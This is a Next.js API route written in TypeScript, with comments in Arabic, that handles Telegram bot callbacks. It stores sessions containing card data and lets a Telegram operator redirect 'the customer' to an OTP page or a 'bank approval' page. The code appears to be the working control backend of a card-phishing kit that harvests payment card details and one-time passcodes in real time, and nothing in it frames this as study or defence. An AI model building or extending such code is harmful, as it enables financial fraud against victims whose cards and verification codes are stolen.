import type { NextApiRequest, NextApiResponse } from 'next';
import axios from 'axios';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

// استخدام global sessions المشتركة
declare global {
  var __sessions: Record<string, { action: string | null; timestamp: number; cardData?: any }> | undefined;
  var __messageToSession: Record<number, string> | undefined;
}

if (!global.__sessions) {
  global.__sessions = {};
}
if (!global.__messageToSession) {
  global.__messageToSession = {};
}

const sessions = global.__sessions;
const messageToSession = global.__messageToSession;

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false });
  }

  try {
    const update = req.body;

    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const messageId = update.callback_query.message.message_id;

      // العثور على الجلسة
      const sessionId = messageToSession[messageId] || callbackData.split('_')[1];

      if (sessionId && sessions[sessionId]) {
        if (callbackData.startsWith('otp_')) {
          sessions[sessionId].action = 'redirect_otp';
        } else if (callbackData.startsWith('bank_')) {
          sessions[sessionId].action = 'redirect_bank';
        }

        // الرد على Telegram
        await axios
          .post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: callbackData.startsWith('otp_')
              ? '✅ جاري توجيه العميل إلى صفحة OTP'
              : '✅ جاري توجيه العميل إلى موافقة البنك',
          })
          .catch(() => {});
      }
    }

    res.status(200).json({ ok: true });
  } catch (error) {
    console.error('خطأ في Webhook:', error);
    res.status(200).json({ ok: false });
  }
}
